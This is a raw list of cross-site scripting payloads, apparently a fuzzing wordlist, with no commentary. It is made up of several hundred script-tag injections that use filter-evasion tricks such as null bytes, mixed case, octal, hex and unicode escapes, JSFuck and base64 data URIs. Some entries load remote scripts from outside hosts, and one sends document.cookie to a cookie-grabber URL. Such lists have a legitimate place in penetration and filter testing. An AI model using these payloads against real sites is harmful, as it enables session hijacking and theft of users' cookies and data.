&s=%3C/title%3E%3Cbody+onload%3Dalert(1)%3E&Search=Search&comic=23&show=advanced&b=1&t=1
&s=';alert(0)//
&s_all=1%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert%28String.fromCharCode%2888,83,83%29%29%3B%3C/ScRiPt%3E&s_any=1%00%22%27%3E%3CScRiPt%20%0A%0D%3Ealert%28String.fromCharCode%2888,83,83%29%29%3B%3C/ScRiPt%3E.&s_exact=1%00%27%22%3E%3CScRiPt%20%0A%0D%3Ealert%28String.fromCharCode%2888,83,83%29%29%3B%3C/ScRiPt%3E.&s_without=1%00%22%27%3E%3CScRiPt%20%0A%0D%3Ealert%28String.fromCharCode%2888,83,83%29%29%3B%3C/ScRiPt%3E&action=search
&s=asd%3Cscript%3Ealert(/XSSPOSED/)%3C/script%3E
&';}},{scope:'email,user_about_me,user_hometown,user_interests,user_likes,user_status,user_website,user_birthday,publish_stream,publish_actions,offline_access'});}alert(0);b=function(response){c=({a:{//
<<scr\0ipt/src=http://xss.com/xss.js></script
<scri%00pt>alert(1);</scri%00pt>
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script>({0:#0=alert/#0#/#0#(0)})</script>
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script%0a%0dConfirm(1);</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script%20src="//www.dropbox.com/s/hp796og5p9va7zt/face.js?dl=1">
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>a=/CrossSiteScripting/ alert(a.source)</SCRIPT>
<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
>"<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
<script ~~~>alert(0%0)</script ~~~>
<script ~~~>alert(0%0)</script ~~~>
<script ~~~>alert(0%0)</script ~~~>
<script ~~~>alert(0%0)</script ~~~>
<<script>alert(0)</script>
"><script>alert(0)</script>
'';!--"<script>alert(0);</script>=&{(alert(1))}
<script>alert(123)</script>
<script>alert(123)</script>
<%<!--'%><script>alert(1);</script -->
<%<!--'%><script>alert(1);</script -->
<%<!--'%><script>alert(1);</script -->
<%<!--'%><script>alert(1);</script -->
<%<!--'%><script>alert(1);</script -->
<%<!--'%><script>alert(1);</script -->
<script>alert`1`</script>
<script>alert(1)</script>
<script>alert(1)</script>
<script>alert(1);</script>
&<script>alert(1)</script>
<sCRiPt>alert(1);</sCRipT>
'> <script>alert(3)</script>
> <script>alert(4)</script>
`> <script>alert(5)</script>
<<SCRIPT>alert("CrossSiteScripting");//<</SCRIPT>
<script>alert(document.cookie)</script><div style="1@gmail.com
>"<script>alert(document.cookie)</script><div style="1@gmail.com
<script>alert(document.cookie)</script>@gmail.com
>"<script>alert(document.cookie)</script>@gmail.com
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.head.childNodes[3].text)</script>
<script>alert(document.head.innerHTML.substr(146,20));</script>
<script>alert("hellox worldss");</script>
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script ^__^>alert(String.fromCharCode(49))</script ^__^
<script ^__^>alert(String.fromCharCode(49))</script ^__^
<script ^__^>alert(String.fromCharCode(49))</script ^__^
<script ^__^>alert(String.fromCharCode(49))</script ^__^
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<script>alert(String.fromCharCode(88,83,83))</script>
"><script alert(String.fromCharCode(88,83,83))</script>
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
"><script>alert('test')</script>
>“<ScriPt>ALeRt("VlAb")</scriPt>
='><script>alert("xss")</script>
<script>alert('XSS');</script>
'">><script>alert('XSS')</script>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<SCRIPT>alert('XSS')</SCRIPT>
<script>alert("XSS");</script>&search=1
<script' + Array(999999).join('/') + '>alert(1)<\/script>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
<SCRIPT a=">" SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<SCRIPT <B>document.cookie=true;</SCRIPT>
>"<SCRIPT <B>document.cookie=true;</SCRIPT>
<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<script charset="\x22>javascript:alert(1)</script>
<script charset="\x22>javascript:alert(1)</script>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<SCriPt>delete alert;alert(1)</sCriPt>
<<script>document.cookie=true;</script>
<!-- -- --><script>document.cookie=true;</script><!-- -- -->
<script>document.cookie=true;//--></script>
>"<<script>document.cookie=true;</script>
>"<!-- -- --><script>document.cookie=true;</script><!-- -- -->
>"<script>document.cookie=true;//--></script>
>"&<script>document.cookie=true;</script>
&<script>document.cookie=true;</script>
<SCRIPT>document.cookie=true;</SCRIPT>
<SCRIPT>document.cookie=true;</SCRIPT>
<SCRIPT>document.cookie=true;//<</SCRIPT>
>"<SCRIPT>document.cookie=true;</SCRIPT>
>"<SCRIPT>document.cookie=true;</SCRIPT>
>"<SCRIPT>document.cookie=true;//<</SCRIPT>
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<SCRIPT>document.write("XSS");</SCRIPT>
<script>eval("\141\154\145\162\164`1`")</script> // Octal escapes combined ES6 Diacritical Grave
<script>eval(location.hash)</script> (Firefox)
<script>eval(location.hash.slice(1))</script>
<script>eval("\x61\x6c\x65\x72\x74(1)");</script> // Hexadecimal escapes using eval
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
<script> function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
<script> function foo(elem, doc, text) { elem.onclick = function (e) { e.__defineGetter__(text[0], function () { return true }) alert(Safe.get()); }; var event = doc.createEvent(text[1]); event.initEvent(text[2], true, true); elem.dispatchEvent(event); } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
<script> (function (o) { function exploit(x) { if (x !== null) alert('User cookie is ' %2B x); else console.log('fail'); } o.onclick = function (e) { e.__defineGetter__('isTrusted', function () { return true; }); exploit(Safe.get()); }; var e = document.createEvent('MouseEvent'); e.initEvent('click', true, true); o.dispatchEvent(e); })(document.getElementById('safe123')); </script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<script?=">"?="http://yoursite.com/xss.js?69,69"></script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script itworksinallbrowsers>/*<script* */alert(1)</script ?
<script itworksinallbrowsers>/*<script* */alert(1)</script ​
<script>javascript:alert(1)</script>
<script>javascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script>javascript:alert(1)</script\x0B
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)<\x00/script>
<script>javascript:alert(1)<\x00/script>
'""><script language="JavaScript"> alert('X nS nS');</script>
<script language="JavaScript">alert('XSS')</script>
<script language='javascript' src='%(jscript)s'></script>
<script language='javascript' src='%(jscript)s'></script>
<SCRIPT LANGUAGE="VBScript">%0a%0dFunction window_onload%0a%0dAlert 1%0a%0dEnd Function </SCRIPT>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="??(document.cookie)</script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<script>parent['alert'](1)</script>
<script>%(payload)s</script>
<script>%(payload)s</script>
<<SCRIPT>%(payload)s//<</SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
</script><script>alert(1)</script>
</script><script >alert(document.cookie)</script>
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script><iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
</script></script><<<<script><>>>><<<script>alert(123)</script>
<script>self['alert'](2)</script>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>setTimeout("a" + "lert" + "(1)");</script> // Using Basic Concatenation
<script>setTimeout(/a/.source + /lert/.source + "(1)");</script> // Using source property for concatenation
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<script src="#">{alert(1)}</script>;1
<SCRIPT/SRC=DATA:,%61%6c%65%72%74%28%31%29></SCRIPT> //Cross Browser (PEPE Vila)
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<SCRIPT/SRC="DATA:TEXT/JAVASCRIPT;BASE64,YSA9CSIJCWMJCW8JCW4JCXMJCXQJCXIJCXUJCXAJCW0JKDEJ KTEJCSIJICA7IEI9W10JICA7QT0JCTIJICA7CWM9CWEJW0EJCV0JICA7QT0JCTUJICA7CW89CWEJW0EJCV0JICA7QT 0JCUEJK0EJLTEJLTEJICA7CW49CWEJW0EJCV0JICA7QT0JIEEJK0EJLTUJICA7CXM9CWEJW0EJCV0JICA7QT0JIEEJCS 0JLTMJICA7CXQ9CWEJW0EJCV0JICA7QT0JIEEJCS0JLTMJICA7CXI9CWEJW0EJCV0JICA7QT0JIEEJCS0JLTMJICA7CX U9CWEJW0EJCV0JICA7QT0JIEEJCS0JLTMJICA7CXA9CWEJW0EJCV0JICA7QT0JIEEJCS0JLTMJICA7CW09CWEJW0E JCV0JICA7QT0JIEEJCS0JLTIJICA7CUQ9CWEJW0EJCV0JICA7QT0JIEEJCS0JLTMJICA7CUU9CWEJW0EJCV0JICA7QT0 JIEEJCS0JLTEJICA7CUY9CWEJW0EJCV0JICA7IEM9ICBCW2MJK28JK24JK3MJK3QJK3IJK3UJK2MJK3QJK28JK3IJCV 0JW2MJK28JK24JK3MJK3QJK3IJK3UJK2MJK3QJK28JK3IJCV0JICA7IEMJKHAJK3IJK28JK20JK3AJK3QJK0QJK0YJK0 UJKSAJKCAJKSAJICA7"></SCRIPT>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<SCRIPT SRC=//ha.ckers.org/.j>
<SCRIPT SRC=//ha.ckers.org/.j>
<SCRIPT SRC=//ha.ckers.org/.j>
<SCRIPT SRC=//ha.ckers.org/.j>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
